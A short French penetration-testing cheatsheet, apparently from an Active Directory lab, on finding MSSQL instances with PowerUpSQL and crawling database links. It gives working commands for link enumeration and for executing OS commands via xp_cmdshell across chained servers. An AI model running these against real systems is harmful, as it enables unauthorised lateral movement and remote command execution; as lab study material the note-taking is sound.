# Cheatsheet - MSSQL et PowerUpSQL

> [!summary] Objectif
> Découvrir les instances SQL du domaine puis crawler les *database links* — un lien SQL mal cloisonné peut chaîner l'exécution de commandes d'un serveur à l'autre, y compris cross-forest.

### Discover SQL instances
```powershell
Import-Module C:\AD\Tools\PowerUpSQLmaster\PowerupSQL.psd1
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose
```

### Read database links manually
```sql
select * from master..sysservers
select * from openquery("DCORP-SQL1",'select * from master..sysservers')
select * from openquery("DCORP-SQL1",'select * from openquery("DCORPMGMT",''select * from master..sysservers'')')
```
Ces requêtes imbriquées montrent le chaînage `DCORP-MSSQL → DCORP-SQL1 → DCORP-MGMT` — c'est exactement ce que `Get-SQLServerLinkCrawl` automatise ensuite.

### Crawl automatically and execute
```powershell
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'SELECT @@version'
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget <target>
```
Commencer par une requête de lecture (`SELECT @@version`) avant `xp_cmdshell` pour confirmer la portée réelle de la chaîne sans déclencher d'exécution.

**Link** — [[Synthèse - MSSQL]] · [[Cheatsheet - Trusts et forêts]] · [[Cheatsheet - Outils Windows Linux]]
